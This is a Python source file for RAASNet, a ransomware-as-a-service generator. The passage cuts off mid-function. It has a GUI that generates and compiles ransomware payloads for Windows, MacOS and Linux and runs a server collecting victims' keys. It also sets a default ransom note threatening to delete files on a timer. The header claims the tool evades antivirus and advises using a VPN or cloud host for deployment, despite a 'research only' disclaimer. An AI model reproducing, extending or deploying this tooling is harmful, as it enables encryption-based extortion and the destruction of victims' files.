#!/usr/bin/env python3
'''
====================================== WELCOME TO RAASNet ==========================================

Your Ransomware As A Service (RAAS) Tool for all your hacking needs.

=========================================== INSTALLATION ===========================================
To use all features of this software, please do:
pip3 install -r requirements.txt

=========================================== PLEASE READ ===========================================

This was made to demonstrate ransomware and how easy it is to make.
It works on Windows, Linux and MacOS.
It's recommended to compile payload.py to EXE to make it more portable.

I do work on security awareness trainings and test the IT security and safety
for other companies and you guessed it; this was made for the demo section
of my presentation, NOT TO EARN MONEY OR BRICK PEOPLES COMPUTERS.

This script does not get detected by any anti-virus.
Self made scripts go undetected 99% of the time.
It's easy to write something nasty like ransomware, adware, malware, you name it.
Again, this script was for research only. Not ment to be used in the open world.
I am not responsible for any damage you may cause with this knowledge.

I recommend a VPN that allows port forwarding (For example; PIA VPN) when
using this outside your network, or better,
a cloud computer hosted elsewhere, like Amazon AWS.

The conclusion of this project is that it is easy to brick a system and earn money doing it.
This script doesn't use any exploits to achieve its goal,
but can easily be coded into it as a nice feature.

===================================================================================================
'''

# Headers
__author__ = "Leon Voerman"
__copyright__ = "Copyright 2019, Incoming Security"
__license__ = "GPLv3"
__version__ = "1.0.0"
__maintainer__ = "Leon Voerman"
__email__ = "I don't need spam, open an issue on GitHub, thank you :)"
__status__ = "Production"

import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64, platform, base64
from tkinter import *
from tkinter.ttk import *
from ttkthemes import ThemedStyle
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
from tkinter.filedialog import askdirectory
from pymsgbox import *
from io import BytesIO

from src.create_demon import *

try:
    from Crypto import Random
    from Crypto.Cipher import AES
    from pymsgbox import *
except ImportError as e:
    print('ERROR - Failed to import some modules.\n\n%s' % e)
    pass

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def dec_key():
    key = password(text='Please enter your decryption key', title='Enter Key', mask ='*')
    if key == None or key == '':
        messagebox.showwarning('Error', 'Please, enter your key.')
        return False
    if not len(key) == 32:
        messagebox.showwarning('Invalid Key', 'Key should be 32 characters long')
        return False
    return key

def dec_path():
    path = askdirectory(title = 'Select directory with files to decrypt')
    if path == None or path == '':
        messagebox.showwarning('Error', 'No path selected, exiting...')
        return False
    path =  path + '/'
    return path

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def decrypt_file(file_name, key):
    with open(file_name, 'rb') as f:
        ciphertext = f.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-6], 'wb') as f:
        f.write(dec)

class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "RAASNet v0.1 (Public Test)") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.ttkStyle = ThemedStyle()
        self.ttkStyle.set_theme("arc")
        #icon = PIL.ImageTk.PhotoImage(resource_path('images/logo2.png'))
        #self.tk.call('wm', 'iconphoto', self._w, icon) # Call app icon
        # Top menu
        menu = Menu(self)
        # File dropdown
        filemenu = Menu(menu, tearoff=0)
        filemenu.add_command(label="Quit", command=self.exit)
        menu.add_cascade(label="File", menu=filemenu)

        # Help dropdown
        help = Menu(menu, tearoff=0)
        help.add_command(label="View License", command=self.view_license)
        help.add_command(label="Activate License", command=self.exit)
        help.add_command(label="Visit Project on GitHub", command=self.open_github)
        menu.add_cascade(label="Help", menu=help)

        self.config(background = 'white', menu=menu)

        # Input field data is being inserted in this dict
        self.options = {
            'agreed' : IntVar(),
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
            'os' : StringVar(),
            'full_screen_var' : IntVar(),
            'mode' : IntVar(),
            'demo' : IntVar(),
            'ghost' : IntVar(),
            'icon_path' : StringVar(),
            'payload_path' : StringVar(),
            'msg' : StringVar(),
            'new_msg' : StringVar(),
            'img_base64' : StringVar(),
        }


        #<activate>
        #<activate>

        if not self.options['agreed'].get() == 1:
            self.show_license()

        # Default Settings
        self.options['host'].set('127.0.0.1')
        self.options['port'].set(8989)
        self.options['full_screen_var'].set(1)
        self.options['mode'].set(1)
        self.options['demo'].set(0)
        self.options['ghost'].set(0)

        self.options['msg'].set('''Tango Down!

Seems like you got hit by DemonWare ransomware!

Don't Panic, you get have your files back!

DemonWare uses a basic encryption script to lock your files.
This type of ransomware is known as CRYPTO.
You'll need a decryption key in order to unlock your files.

Your files will be deleted when the timer runs out, so you better hurry.
You have 10 hours to find your key

C'mon, be glad I don't ask for payment like other ransomware.

Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.

Kind regards,

Zeznzo
''')
        self.options['img_base64'].set('''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''')

        self.bind("<Escape>", self.exit_event) # Press ESC to quit app

        photo = PIL.Image.open(resource_path('images/logo2.png'))
        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
        photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self, image=photo, background = 'white')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0, columnspan = 3, rowspan = 4)

        Label(self, text = 'RAASNet Generator', background = 'white', foreground = 'red', font='Helvetica 32 bold').grid(row = 2, column = 3, columnspan = 3)

        # Buttons
        start_server = Button(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 4, column = 0, columnspan = 6)
        generate_demon = Button(self, text = "GENERATE PAYLOAD", command = self.generate, width = 53).grid(row = 5, column = 0, columnspan = 6)
        compile = Button(self, text = "COMPILE PAYLOAD", command = self.compile, width = 53).grid(row = 6, column = 0, columnspan = 6)
        decrypt = Button(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 53).grid(row = 7, column = 0, columnspan = 6)
        exit = Button(self, text = "EXIT", command = self.exit, width = 53).grid(row = 8, column = 0, columnspan = 6)

    def open_server(self):
        self.set = Toplevel()
        self.set.title(string = 'Settings')
        self.set.configure(background = 'white')
        self.set.resizable(0,0)

        Label(self.set, text = 'Host', background = 'white').grid(row = 1, column = 0, sticky = 'w')
        host = Entry(self.set, textvariable = self.options['host'], width = 30)
        host.grid(row = 2, column = 0, columnspan = 2)
        host.focus()

        Label(self.set, text = 'port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
        port = Entry(self.set, textvariable = self.options['port'], width = 30)
        port.grid(row = 4, column = 0, columnspan = 2)

        if host == None or host == '':
            messagebox.showwarning('ERROR', 'Invalid host!')
        elif port == None or port == '':
            messagebox.showwarning('ERROR', 'Invalid port!')
        else:
            self.options['host'] == host
            self.options['port'] == port

        go = Button(self.set, text = 'Ok', command = self.run_server, width = 30)
        go.grid(row = 7, column = 0, columnspan = 2)
        self.set.bind('<Return>', self.set.destroy)
        close_register = Button(self.set, text = 'Cancel', command = self.set.destroy, width = 30).grid(row = 8, column = 0, columnspan = 2)

    def run_server(self):
        self.set.destroy()
        self.serv = Toplevel()
        self.serv.title(string = 'Demonware Server - Key Collector')
        self.serv.configure(background = 'white')
        self.serv.resizable(0,0)

        self.serv.bind("<Escape>", self.close_server) # Press ESC to close window

        # Input field data is being inserted in this dict
        self.serv.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
        }

        # Canvas for image
        canvas = Canvas(self.serv, highlightthickness=0, height = 150, width = 500, background = 'white')
        canvas.grid(row=0, column=0, columnspan = 4)

        #photo = PIL.ImageTk.PhotoImage(PIL.Image.open(BytesIO(base64.b64decode(photo_code))))
        photo = PIL.Image.open(resource_path('images/logo2.png'))
        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
        photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self.serv, image=photo)
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0)

        label2 = Label(self.serv, image=photo)
        label2.image = photo # keep a reference!
        label2.grid(row = 0, column = 3)

        # Log Frame
        result = LabelFrame(self.serv, text = 'Log', relief = GROOVE)
        result.grid(row = 1, column = 0, rowspan = 4, columnspan = 4)
        self.serv.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
        self.serv.options['log'].grid(row = 0, column = 1)

        # Tags
        self.serv.options['log'].tag_configure('yellow', foreground='yellow')
        self.serv.options['log'].tag_configure('red', foreground='red')
        self.serv.options['log'].tag_configure('deeppink', foreground='deeppink')
        self.serv.options['log'].tag_configure('orange', foreground='orange')
        self.serv.options['log'].tag_configure('green', foreground='green')
        self.serv.options['log'].tag_configure('bold', font='bold')

        header = 'Occured'.ljust(20), 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
        self.serv.options['log'].insert('1.0', '{0[0]} {0[1]} {0[2]} {0[3]} {0[4]}'.format(header), 'green')

        self.start_thread()

    def compile(self):
        self.comp = Toplevel()
        self.comp.title(string = 'Compile')
        self.comp.configure(background = 'white')
        self.comp.resizable(0,0)

        self.comp.bind("<Escape>", self.close_compile) # Press ESC to close window

        if os.path.isfile('./payload.py'):
            self.options['payload_path'].set('./payload.py')

        msg = LabelFrame(self.comp, text = 'Message', relief = GROOVE)
        msg.grid(row = 0, column = 0, columnspan = 3, sticky = 'w')
        Label(msg, text = 'You seem to be running %s.\nYou can only compile for the OS you are running this software on.' % platform.system(), background = 'white', font='Helvetica 16').grid(row = 0, column = 0)

        os_frame = LabelFrame(self.comp, text = 'Select OS')
        os_frame.grid(row = 1, column = 0)
        win = Radiobutton(os_frame, text = 'Windows', variable = self.options['os'], value = 'windows')
        win.grid(row = 0, column = 0, sticky = 'w')
        mac = Radiobutton(os_frame, text = 'MacOS', variable = self.options['os'], value = 'mac')
        mac.grid(row = 1, column = 0, sticky = 'w')
        lin = Radiobutton(os_frame, text = 'Linux', variable = self.options['os'], value = 'linux')
        lin.grid(row = 2, column = 0, sticky = 'w')

        sett_frame = LabelFrame(self.comp, text = 'Options')
        sett_frame.grid(row = 1, column = 1, columnspan = 2)
        Entry(sett_frame, textvariable = self.options['icon_path'], width = 50).grid(row = 0, column = 0)
        set_ico = Button(sett_frame, text = "SELECT ICON", command = self.select_icon, width = 15).grid(row = 0, column = 1)

        Entry(sett_frame, textvariable = self.options['payload_path'], width = 50).grid(row = 1, column = 0)
        set_payload = Button(sett_frame, text = "SELECT PAYLOAD", command = self.select_payload, width = 15).grid(row = 1, column = 1)

        opt_frame = LabelFrame(self.comp, text = 'Finishing')
        opt_frame.grid(row = 2, column = 0, columnspan = 2)
        finish = Button(opt_frame, text = "FINISH", command = self.compile_payload, width = 45).grid(row = 0, column = 0)

        if platform.system() == 'Windows':
            self.options['os'].set('windows')
            mac.config(state = DISABLED)
            lin.config(state = DISABLED)
        elif platform.system() == 'Darwin':
            self.options['os'].set('mac')
            win.config(state = DISABLED)
            lin.config(state = DISABLED)
        elif platform.system() == 'Linux':
            self.options['os'].set('linux')
            win.config(state = DISABLED)
            mac.config(state = DISABLED)

    def compile_payload(self):
        icon = False

        if not self.options['icon_path'].get() == '':
            if not os.path.isfile(self.options['icon_path'].get()):
                return messagebox.showwarning('ERROR', 'Icon File Not Found!')
            else:
                icon = True
        if not os.path.isfile(self.options['payload_path'].get()):
            return messagebox.showwarning('ERROR', 'Payload Not Found!')

        try:
            if self.options['os'].get() == 'windows':
                py = 'pyinstaller.exe'
            else:
                py = 'pyinstaller'

            if icon == True:
                os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome --hidden-import io %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
            else:
                os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import pycryptodome --hidden-import io %s" % (py, self.options['payload_path'].get()))

            messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
            self.comp.destroy()

        except Exception as e:
